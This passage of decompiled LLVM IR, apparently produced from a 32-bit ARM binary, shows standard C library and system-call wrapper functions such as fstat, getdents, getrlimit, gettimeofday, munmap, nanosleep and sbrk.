  store i32 %v1_14d30, i32* %v4_14d38, align 4
  %v0_14cec.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cec

; uselistorder directives
  uselistorder i32 %v0_14d18, { 0, 2, 1 }
  uselistorder i32 %v0_14cec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d18, { 1, 0 }
  uselistorder label %dec_label_pc_14cec, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14d50 = load i32, i32* @r1, align 4
  store i32 %v0_14d50, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14d60 = load i32, i32* @r0, align 4
  store i32 %v0_14d60, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14d60, -4095
  br i1 %tmp, label %dec_label_pc_14d88, label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %entry
  %v0_14d70 = call i32 @__aeabi_read_tp()
  %v3_14d74 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14d74 = sext i16 %v3_14d74 to i32
  store i32 %v4_14d74, i32* @r3, align 4
  %v0_14d78 = load i32, i32* @r2, align 4
  %v1_14d78 = sub i32 0, %v0_14d78
  store i32 %v1_14d78, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14d80 = add i32 %v4_14d74, %v0_14d70
  %v4_14d80 = inttoptr i32 %v3_14d80 to i32*
  store i32 %v1_14d78, i32* %v4_14d80, align 4
  br label %dec_label_pc_14d98

dec_label_pc_14d88:                               ; preds = %entry
  store i32 %v0_14d60, i32* %r7.global-to-local, align 4
  %v2_14d88 = icmp eq i32 %v0_14d60, 0
  br i1 %v2_14d88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14d88
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14d88, %bb
  call void @__pseudo_cond_branch(i1 %v2_14d88, i32 ptrtoint (i32* @global_var_151d8.581 to i32))
  br label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d6c, %.thread
  %v0_14d98 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14d98

; uselistorder directives
  uselistorder i32 %v0_14d60, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14d98, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_14dac = load i32, i32* @r5, align 4
  %v18_14dac = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14de4, label %dec_label_pc_14dc8

dec_label_pc_14dc8:                               ; preds = %entry
  %v1_14dcc = sub i32 0, %arg1
  %v3_14dd0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14dd0 = sext i16 %v3_14dd0 to i32
  store i32 %v4_14dd0, i32* %r3.global-to-local, align 4
  %v0_14dd4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_14ddc = add i32 %v4_14dd0, %v0_14dd4
  %v4_14ddc = inttoptr i32 %v3_14ddc to i32*
  store i32 %v1_14dcc, i32* %v4_14ddc, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14de4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14de4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_14dec = add i32 %arg2, %arg1
  store i32 %v3_14dec, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14de4, %bb
  %v1_14e284 = phi i32 [ %v18_14dac, %dec_label_pc_14de4 ], [ %v3_14dec, %bb ]
  %v0_14e242 = phi i32 [ 141, %dec_label_pc_14de4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14e38, label %dec_label_pc_14e24

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14e24
  %v1_14e2c = inttoptr i32 %v1_14e24 to i8*
  %v1_14df8 = add i32 %v0_14df8, 8
  %v2_14df8 = inttoptr i32 %v1_14df8 to i16*
  %v3_14df8 = load i16, i16* %v2_14df8, align 2
  %v4_14df8 = zext i16 %v3_14df8 to i32
  %v2_14dfc = add i32 %v4_14df8, %v0_14df8
  store i32 %v2_14dfc, i32* @r3, align 4
  %v1_14e00 = add i32 %v2_14dfc, -1
  %v2_14e00 = inttoptr i32 %v1_14e00 to i8*
  %v3_14e00 = load i8, i8* %v2_14e00, align 1
  %v4_14e00 = zext i8 %v3_14e00 to i32
  store i32 %v4_14e00, i32* @r4, align 4
  %v3_14e04 = call i32 @strlen(i8* %v1_14e2c)
  %v0_14e08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14e08, i32* @r1, align 4
  %v1_14e0c = add i32 %v3_14e04, 1
  store i32 %v1_14e0c, i32* @r2, align 4
  %v0_14e10 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14e10, i32* @r0, align 4
  %v3_14e14 = call i32 @memmove(i32 %v0_14e10, i32 %v0_14e08, i32 %v1_14e0c)
  %v0_14e18 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e18 = add i32 %v0_14e18, 8
  %v2_14e18 = inttoptr i32 %v1_14e18 to i16*
  %v3_14e18 = load i16, i16* %v2_14e18, align 2
  %v4_14e18 = zext i16 %v3_14e18 to i32
  store i32 %v4_14e18, i32* %r3.global-to-local, align 4
  %v0_14e1c = load i32, i32* @r4, align 4
  %v1_14e1c = trunc i32 %v0_14e1c to i8
  %v3_14e1c = add i32 %v0_14e18, 10
  %v4_14e1c = inttoptr i32 %v3_14e1c to i8*
  store i8 %v1_14e1c, i8* %v4_14e1c, align 1
  %v0_14e20 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e20 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e20 = add i32 %v1_14e20, %v0_14e20
  store i32 %v2_14e20, i32* %r7.global-to-local, align 4
  %v1_14e28.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %.thread, %dec_label_pc_14df8
  %v1_14e28 = phi i32 [ %v1_14e28.pre, %dec_label_pc_14df8 ], [ %v1_14e284, %.thread ]
  %v0_14df8 = phi i32 [ %v2_14e20, %dec_label_pc_14df8 ], [ %v0_14e242, %.thread ]
  %v1_14e24 = add i32 %v0_14df8, 10
  store i32 %v1_14e24, i32* %r6.global-to-local, align 4
  %v3_14e28 = icmp ult i32 %v0_14df8, %v1_14e28
  %v1_14e30 = add i32 %v0_14df8, 11
  store i32 %v1_14e30, i32* %r8.global-to-local, align 4
  br i1 %v3_14e28, label %dec_label_pc_14df8, label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e24, %.thread, %dec_label_pc_14dc8
  %v0_14e38 = load i32, i32* @r5, align 4
  store i32 %v6_14dac, i32* @r5, align 4
  store i32 %v18_14dac, i32* @sl, align 4
  ret i32 %v0_14e38

; uselistorder directives
  uselistorder i32 %v1_14e24, { 1, 0 }
  uselistorder i32 %v0_14df8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_14dac, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14e24, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14e50 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14e5c = call i32 @getrlimit(i32 7, i32 %v2_14e50)
  %v1_14e60 = icmp slt i32 %v2_14e5c, 0
  %v5_14e64 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14e60, i32 256, i32 %v5_14e64
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_14e88 = load i32, i32* @r0, align 4
  ret i32 %v1_14e88
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_14e9c = load i32, i32* @r0, align 4
  ret i32 %v1_14e9c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14eb0 = load i32, i32* @r0, align 4
  ret i32 %v1_14eb0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_14ec0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 148) to i32*), align 4
  %v1_14ec4 = inttoptr i32 %v4_14ec0 to i32*
  %v2_14ec4 = load i32, i32* %v1_14ec4, align 4
  %v2_14ec8 = icmp eq i32 %v2_14ec4, 0
  br i1 %v2_14ec8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14ed0 = phi i32 [ %v2_14ec4, %entry ], [ 4096, %bb ]
  ret i32 %v1_14ed0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14f08, label %dec_label_pc_14ef0

dec_label_pc_14ef0:                               ; preds = %entry
  %v1_14ef4 = sub i32 0, %arg1
  %v3_14ef8 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14ef8 = sext i16 %v3_14ef8 to i32
  %v0_14efc = call i32 @__aeabi_read_tp()
  %v3_14f00 = add i32 %v4_14ef8, %v0_14efc
  %v4_14f00 = inttoptr i32 %v3_14f00 to i32*
  store i32 %v1_14ef4, i32* %v4_14f00, align 4
  br label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %entry, %dec_label_pc_14ef0
  %v1_14f0c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14ef0 ]
  ret i32 %v1_14f0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14f08, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14f14 = load i32, i32* @r7, align 4
  store i32 %v3_14f14, i32* %stack_var_-8, align 4
  %v0_14f20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14f20, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14f20, -4095
  br i1 %tmp, label %dec_label_pc_14f48, label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %entry
  %v0_14f34 = call i32 @__aeabi_read_tp()
  %v3_14f38 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14f38 = sext i16 %v3_14f38 to i32
  store i32 %v4_14f38, i32* @r3, align 4
  %v0_14f3c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f3c = sub i32 0, %v0_14f3c
  store i32 %v1_14f3c, i32* %r2.global-to-local, align 4
  %v3_14f40 = add i32 %v4_14f38, %v0_14f34
  %v4_14f40 = inttoptr i32 %v3_14f40 to i32*
  store i32 %v1_14f3c, i32* %v4_14f40, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14f48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f48

dec_label_pc_14f48:                               ; preds = %entry, %dec_label_pc_14f30
  %v1_14f4c = phi i32 [ %v0_14f20, %entry ], [ -1, %dec_label_pc_14f30 ]
  %v2_14f48 = phi i32 [ %v3_14f14, %entry ], [ %v2_14f48.pre, %dec_label_pc_14f30 ]
  store i32 %v2_14f48, i32* @r7, align 4
  ret i32 %v1_14f4c

; uselistorder directives
  uselistorder i32 %v0_14f20, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f48, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_14f64 = load i32, i32* @r0, align 4
  ret i32 %v1_14f64
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14f68 = load i32, i32* @r4, align 4
  store i32 %v3_14f68, i32* %stack_var_-12, align 4
  %v0_14f78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14f78, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14f78, -4095
  br i1 %tmp, label %dec_label_pc_14fa0, label %dec_label_pc_14f88

dec_label_pc_14f88:                               ; preds = %entry
  %v0_14f8c = call i32 @__aeabi_read_tp()
  %v3_14f90 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14f90 = sext i16 %v3_14f90 to i32
  %v0_14f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f94 = sub i32 0, %v0_14f94
  store i32 %v1_14f94, i32* %r2.global-to-local, align 4
  %v3_14f98 = add i32 %v4_14f90, %v0_14f8c
  %v4_14f98 = inttoptr i32 %v3_14f98 to i32*
  store i32 %v1_14f94, i32* %v4_14f98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14fa0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %entry, %dec_label_pc_14f88
  %v1_14fa4 = phi i32 [ %v0_14f78, %entry ], [ -1, %dec_label_pc_14f88 ]
  %v2_14fa0 = phi i32 [ %v3_14f68, %entry ], [ %v2_14fa0.pre, %dec_label_pc_14f88 ]
  store i32 %v2_14fa0, i32* @r4, align 4
  ret i32 %v1_14fa4

; uselistorder directives
  uselistorder i32 %v0_14f78, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fa0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fac = load i32, i32* @r7, align 4
  store i32 %v3_14fac, i32* %stack_var_-8, align 4
  %v0_14fb8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14fb8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14fb8, -4095
  br i1 %tmp, label %dec_label_pc_14fe0, label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %entry
  %v0_14fcc = call i32 @__aeabi_read_tp()
  %v3_14fd0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14fd0 = sext i16 %v3_14fd0 to i32
  %v0_14fd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd4 = sub i32 0, %v0_14fd4
  store i32 %v1_14fd4, i32* %r2.global-to-local, align 4
  %v3_14fd8 = add i32 %v4_14fd0, %v0_14fcc
  %v4_14fd8 = inttoptr i32 %v3_14fd8 to i32*
  store i32 %v1_14fd4, i32* %v4_14fd8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14fe0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %entry, %dec_label_pc_14fc8
  %v1_14fe4 = phi i32 [ %v0_14fb8, %entry ], [ -1, %dec_label_pc_14fc8 ]
  %v2_14fe0 = phi i32 [ %v3_14fac, %entry ], [ %v2_14fe0.pre, %dec_label_pc_14fc8 ]
  store i32 %v2_14fe0, i32* @r7, align 4
  ret i32 %v1_14fe4

; uselistorder directives
  uselistorder i32 %v0_14fb8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fe0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fec = load i32, i32* @r7, align 4
  store i32 %v3_14fec, i32* %stack_var_-8, align 4
  %v0_14ff8 = load i32, i32* @r0, align 4
  store i32 %v0_14ff8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14ff8, -4095
  br i1 %tmp, label %dec_label_pc_15020, label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %entry
  %v0_1500c = call i32 @__aeabi_read_tp()
  %v3_15010 = load i16, i16* @global_var_21a48.352, align 2
  %v4_15010 = sext i16 %v3_15010 to i32
  %v0_15014 = load i32, i32* %r2.global-to-local, align 4
  %v1_15014 = sub i32 0, %v0_15014
  store i32 %v1_15014, i32* %r2.global-to-local, align 4
  %v3_15018 = add i32 %v4_15010, %v0_1500c
  %v4_15018 = inttoptr i32 %v3_15018 to i32*
  store i32 %v1_15014, i32* %v4_15018, align 4
  %v2_15020.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %entry, %dec_label_pc_15008
  %v1_15024 = phi i32 [ %v0_14ff8, %entry ], [ -1, %dec_label_pc_15008 ]
  %v2_15020 = phi i32 [ %v3_14fec, %entry ], [ %v2_15020.pre, %dec_label_pc_15008 ]
  store i32 %v2_15020, i32* @r7, align 4
  ret i32 %v1_15024

; uselistorder directives
  uselistorder i32 %v0_14ff8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15020, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15038 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_1503c = icmp eq i32 %v4_15038, 0
  %v3_15040 = load i32, i32* @r4, align 4
  %v9_15040 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1503c, label %dec_label_pc_15050, label %entry.dec_label_pc_15058_crit_edge

entry.dec_label_pc_15058_crit_edge:               ; preds = %entry
  br label %dec_label_pc_15058

dec_label_pc_15050:                               ; preds = %entry
  store i32 %v3_15040, i32* @r4, align 4
  store i32 %v9_15040, i32* @r6, align 4
  %v0_15054 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %entry.dec_label_pc_15058_crit_edge, %dec_label_pc_15050
  %v0_15058 = call i32 @__libc_enable_asynccancel()
  %v0_1505c = load i32, i32* @r6, align 4
  store i32 %v0_1505c, i32* @r1, align 4
  store i32 %v0_15058, i32* @r5, align 4
  %v0_15064 = load i32, i32* @r4, align 4
  store i32 %v0_15064, i32* @r0, align 4
  %v0_15068 = call i32 @__syscall_nanosleep()
  store i32 %v0_15068, i32* @r4, align 4
  %v0_15070 = load i32, i32* @r5, align 4
  %v1_15074 = call i32 @__libc_disable_asynccancel(i32 %v0_15070)
  %v0_15078 = load i32, i32* @r4, align 4
  ret i32 %v0_15078

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_15058, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1508c = load i32, i32* @r4, align 4
  store i32 %v3_1508c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r4.global-to-local, align 4
  %v4_1509c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 11576) to i32*), align 4
  %v2_150a0 = icmp eq i32 %v4_1509c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_150a0, label %dec_label_pc_150ac, label %dec_label_pc_150bc

dec_label_pc_150ac:                               ; preds = %entry
  %v1_150b0 = call i32 @__GI_brk(i32 0)
  %v1_150b4 = icmp slt i32 %v1_150b0, 0
  br i1 %v1_150b4, label %dec_label_pc_150e0, label %dec_label_pc_150bcthread-pre-split

dec_label_pc_150bcthread-pre-split:               ; preds = %dec_label_pc_150ac
  %v0_150c0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_150bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150bcthread-pre-split, %entry
  %v1_150bc = phi i32 [ %v1_150bc.pre, %dec_label_pc_150bcthread-pre-split ], [ 11576, %entry ]
  %v0_150bc = phi i32 [ %v0_150bc.pre, %dec_label_pc_150bcthread-pre-split ], [ ptrtoint (i32* @global_var_219f0.357 to i32), %entry ]
  %v1_150d0 = phi i32 [ %v0_150c0.pr, %dec_label_pc_150bcthread-pre-split ], [ %arg1, %entry ]
  %v2_150bc = add i32 %v0_150bc, %v1_150bc
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  %v4_150bc = load i32, i32* %v3_150bc, align 4
  %v2_150c0 = icmp eq i32 %v1_150d0, 0
  store i32 %v4_150bc, i32* %r4.global-to-local, align 4
  br i1 %v2_150c0, label %dec_label_pc_150e4, label %dec_label_pc_150cc

dec_label_pc_150cc:                               ; preds = %dec_label_pc_150bc
  %v2_150d0 = add i32 %v4_150bc, %v1_150d0
  %v1_150d4 = call i32 @__GI_brk(i32 %v2_150d0)
  %v1_150d8 = icmp slt i32 %v1_150d4, 0
  br i1 %v1_150d8, label %dec_label_pc_150e0, label %dec_label_pc_150cc.dec_label_pc_150e4_crit_edge

dec_label_pc_150cc.dec_label_pc_150e4_crit_edge:  ; preds = %dec_label_pc_150cc
  %v0_150e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150e4

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150cc, %dec_label_pc_150ac
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150e4

dec_label_pc_150e4:                               ; preds = %dec_label_pc_150bc, %dec_label_pc_150cc.dec_label_pc_150e4_crit_edge, %dec_label_pc_150e0
  %v0_150e4 = phi i32 [ %v0_150e4.pre, %dec_label_pc_150cc.dec_label_pc_150e4_crit_edge ], [ -1, %dec_label_pc_150e0 ], [ %v4_150bc, %dec_label_pc_150bc ]
  %v2_150e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150e8, i32* @r4, align 4
  ret i32 %v0_150e4

; uselistorder directives
  uselistorder i32 %v4_150bc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_150e4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15108 = load i32, i32* @r0, align 4
  ret i32 %v1_15108
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1510c = load i32, i32* @r4, align 4
  store i32 %v3_1510c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15124 = inttoptr i32 %arg2 to i8*
  %v4_15124 = call i32 @__GI_memset(i8* %v3_15124, i32 0, i32 104)
  %v2_15128 = load i32, i32* %arg1, align 4
  store i32 %v2_15128, i32* %r3.global-to-local, align 4
  %v3_15128 = add i32 %tmp, 4
  %v4_15128 = inttoptr i32 %v3_15128 to i32*
  %v5_15128 = load i32, i32* %v4_15128, align 4
  store i32 %v5_15128, i32* %r4.global-to-local, align 4
  %v0_1512c = load i32, i32* %r5.global-to-local, align 4
  %v1_1512c = inttoptr i32 %v0_1512c to i32*
  store i32 %v2_15128, i32* %v1_1512c, align 4
  %v3_1512c = add i32 %v0_1512c, 4
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  %v5_1512c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1512c, i32* %v4_1512c, align 4
  %v0_15130 = load i32, i32* %r6.global-to-local, align 4
  %v1_15130 = add i32 %v0_15130, 12
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  %v1_15134 = load i32, i32* %r5.global-to-local, align 4
  %v2_15134 = add i32 %v1_15134, 12
  %v3_15134 = inttoptr i32 %v2_15134 to i32*
  store i32 %v3_15130, i32* %v3_15134, align 4
  %v0_15138 = load i32, i32* %r6.global-to-local, align 4
  %v1_15138 = add i32 %v0_15138, 96
  store i32 %v1_15138, i32* %r3.global-to-local, align 4
  %v1_1513c = inttoptr i32 %v1_15138 to i32*
  %v2_1513c = load i32, i32* %v1_1513c, align 4
  store i32 %v2_1513c, i32* %r3.global-to-local, align 4
  %v3_1513c = add i32 %v0_15138, 100
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  %v5_1513c = load i32, i32* %v4_1513c, align 4
  store i32 %v5_1513c, i32* %r4.global-to-local, align 4
  %v1_15140 = add i32 %v0_15138, 56
  %v2_15140 = inttoptr i32 %v1_15140 to i32*
  %v3_15140 = load i32, i32* %v2_15140, align 4
  store i32 %v3_15140, i32* %r2.global-to-local, align 4
  %v1_15144 = load i32, i32* %r5.global-to-local, align 4
  %v2_15144 = add i32 %v1_15144, 96
  %v3_15144 = inttoptr i32 %v2_15144 to i32*
  store i32 %v2_1513c, i32* %v3_15144, align 4
  %v0_15148 = load i32, i32* %r4.global-to-local, align 4
  %v1_15148 = load i32, i32* %r5.global-to-local, align 4
  %v2_15148 = add i32 %v1_15148, 100
  %v3_15148 = inttoptr i32 %v2_15148 to i32*
  store i32 %v0_15148, i32* %v3_15148, align 4
  %v0_1514c = load i32, i32* %r6.global-to-local, align 4
  %v1_1514c = add i32 %v0_1514c, 24
  store i32 %v1_1514c, i32* %ip.global-to-local, align 4
  %v1_15150 = inttoptr i32 %v1_1514c to i32*
  %v2_15150 = load i32, i32* %v1_15150, align 4
  store i32 %v2_15150, i32* %ip.global-to-local, align 4
  %v3_15150 = add i32 %v0_1514c, 28
  %v4_15150 = inttoptr i32 %v3_15150 to i32*
  %v5_15150 = load i32, i32* %v4_15150, align 4
  store i32 %v5_15150, i32* %lr.global-to-local, align 4
  %v0_15154 = load i32, i32* %r2.global-to-local, align 4
  %v1_15154 = load i32, i32* %r5.global-to-local, align 4
  %v2_15154 = add i32 %v1_15154, 56
  %v3_15154 = inttoptr i32 %v2_15154 to i32*
  store i32 %v0_15154, i32* %v3_15154, align 4
  %v0_15158 = load i32, i32* %r6.global-to-local, align 4
  %v1_15158 = add i32 %v0_15158, 72
  store i32 %v1_15158, i32* %r3.global-to-local, align 4
  %v1_1515c = add i32 %v0_15158, 32
  store i32 %v1_1515c, i32* %r7.global-to-local, align 4
  %v1_15160 = inttoptr i32 %v1_1515c to i32*
  %v2_15160 = load i32, i32* %v1_15160, align 4
  store i32 %v2_15160, i32* %r7.global-to-local, align 4
  %v3_15160 = add i32 %v0_15158, 36
  %v4_15160 = inttoptr i32 %v3_15160 to i32*
  %v5_15160 = load i32, i32* %v4_15160, align 4
  store i32 %v5_15160, i32* %r8.global-to-local, align 4
  %v1_15164 = inttoptr i32 %v1_15158 to i32*
  %v2_15164 = load i32, i32* %v1_15164, align 4
  %v3_15164 = add i32 %v0_15158, 76
  %v4_15164 = inttoptr i32 %v3_15164 to i32*
  %v5_15164 = load i32, i32* %v4_15164, align 4
  store i32 %v5_15164, i32* %r1.global-to-local, align 4
  %v0_15168 = load i32, i32* %r5.global-to-local, align 4
  %v1_15168 = add i32 %v0_15168, 72
  %v1_1516c = inttoptr i32 %v1_15168 to i32*
  store i32 %v2_15164, i32* %v1_1516c, align 4
  %v3_1516c = add i32 %v0_15168, 76
  %v4_1516c = inttoptr i32 %v3_1516c to i32*
  %v5_1516c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1516c, i32* %v4_1516c, align 4
  %v0_15170 = load i32, i32* %r7.global-to-local, align 4
